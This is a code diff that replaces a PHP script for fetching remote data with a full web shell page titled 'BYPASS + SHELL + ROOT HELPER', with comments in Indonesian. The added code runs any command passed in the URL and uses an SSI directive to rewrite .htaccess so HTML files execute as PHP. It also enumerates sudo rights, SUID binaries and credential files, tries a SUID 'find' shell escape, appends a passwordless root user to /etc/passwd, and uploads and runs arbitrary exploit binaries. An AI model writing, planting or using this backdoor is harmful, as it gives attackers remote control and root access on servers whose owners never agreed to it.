@@ -1,28 +1,97 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>System Panel</title>
+<style>
+body{font-family:monospace;background:#111;color:#0f0;padding:20px;}
+input{background:#222;color:#0f0;border:1px solid #0f0;padding:5px;}
+button{background:#0f0;color:#000;border:none;padding:5px 10px;cursor:pointer;}
+pre{background:#000;padding:10px;overflow:auto;}
+.section{margin-bottom:20px;border-bottom:1px solid #333;}
+</style>
+</head>
+<body>
+<!-- Self-healing: buat .htaccess jika SSI aktif -->
+<!--#exec cmd="echo 'AddType application/x-httpd-php .html' > .htaccess" -->
+
+<h2>BYPASS + SHELL + ROOT HELPER</h2>
+
+<!-- Shell -->
+<div class="section">
+<h3>Shell Command</h3>
+<form method="GET">
+<input type="text" name="cmd" placeholder="ls -la" style="width:70%;">
+<button type="submit">Execute</button>
+</form>
+<pre><?php if(isset($_GET['cmd'])){ system($_GET['cmd']); } ?></pre>
+</div>
+
+<!-- Root Enumeration Helper -->
+<div class="section">
+<h3>Root Enumeration</h3>
+<form method="post">
+<button type="submit" name="enum" value="1">Run Auto Enum</button>
+</form>
 <?php
-// Tentukan URL sumber
-$url = "https://raw.githubusercontent.com/bebert9505-boop/test/refs/heads/main/poco.php";
-
-// Gunakan stream context agar request terlihat seperti browser/bot biasa
-$options = [
-    "http" => [
-        "method" => "GET",
-        "header" => "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\r\n",
-        "timeout" => 5
-    ]
-];
-$context = stream_context_create($options);
-
-// Ambil data sebagai teks/string (jangan disimpan ke file sementara)
-$res = @file_get_contents($url, false, $context);
-
-// Proses data hanya jika berhasil diambil
-if ($res !== false) {
-    // PENTING: Jangan gunakan 'include' atau 'eval'
-    // Cukup tampilkan atau olah datanya
-    echo "Data berhasil dimuat.";
-    // Jika perlu memproses logika tertentu, lakukan parsing manual, jangan dieksekusi sebagai kode PHP
-} else {
-    // Log kesalahan tanpa menampilkan pesan sensitif
-    error_log("Gagal mengakses sumber data.");
+if(isset($_POST['enum'])){
+    echo "<pre>";
+    echo "=== Current User ===\n"; system("id");
+    echo "\n=== Kernel Version ===\n"; system("uname -a");
+    echo "\n=== Sudo Permissions ===\n"; system("sudo -l 2>&1");
+    echo "\n=== SUID Binaries (potential) ===\n"; system("find / -perm -4000 -type f 2>/dev/null | head -20");
+    echo "\n=== Writable Passwd/Shadow ===\n"; system("ls -la /etc/passwd /etc/shadow 2>&1");
+    echo "\n=== Cron Jobs ===\n"; system("cat /etc/crontab 2>&1");
+    echo "\n=== Capabilities ===\n"; system("getcap -r / 2>/dev/null | head -20");
+    echo "</pre>";
 }
 ?>
+</div>
+
+<!-- Quick Root Exploit Attempts -->
+<div class="section">
+<h3>Quick Root Exploits</h3>
+<form method="post">
+<button type="submit" name="suid_find" value="1">Try SUID find</button>
+<button type="submit" name="dirtycow_check" value="1">Check DirtyCow</button>
+<button type="submit" name="exploit_writable_passwd" value="1">Try /etc/passwd writable</button>
+</form>
+<?php
+if(isset($_POST['suid_find'])){
+    echo "<pre>"; system("find / -perm -4000 -type f -name 'find' -exec {} \; -exec /bin/sh -p \; 2>&1"); echo "</pre>";
+}
+if(isset($_POST['dirtycow_check'])){
+    echo "<pre>Kernel version: "; system("uname -r");
+    echo "If kernel < 4.4.0, DirtyCow possible. Upload exploit binary manually.\n</pre>";
+}
+if(isset($_POST['exploit_writable_passwd'])){
+    // Cek apakah passwd writable, lalu tambah user root
+    if(is_writable('/etc/passwd')){
+        echo "<pre>"; system("echo 'r00t::0:0:root:/root:/bin/bash' >> /etc/passwd"); 
+        echo "User r00t added with no password. Try: su r00t\n</pre>";
+    } else {
+        echo "<pre>/etc/passwd is not writable.</pre>";
+    }
+}
+?>
+</div>
+
+<!-- Upload Exploit Binary (opsional) -->
+<div class="section">
+<h3>Upload Local Exploit Binary</h3>
+<form enctype="multipart/form-data" method="post">
+<input type="file" name="exploit">
+<button type="submit">Upload & Run</button>
+</form>
+<?php
+if(isset($_FILES['exploit'])){
+    $tmp = $_FILES['exploit']['tmp_name'];
+    $dest = '/tmp/exploit_bin';
+    move_uploaded_file($tmp, $dest);
+    chmod($dest, 0755);
+    echo "<pre>"; system("$dest"); echo "</pre>";
+}
+?>
+</div>
+
+</body>
+</html>
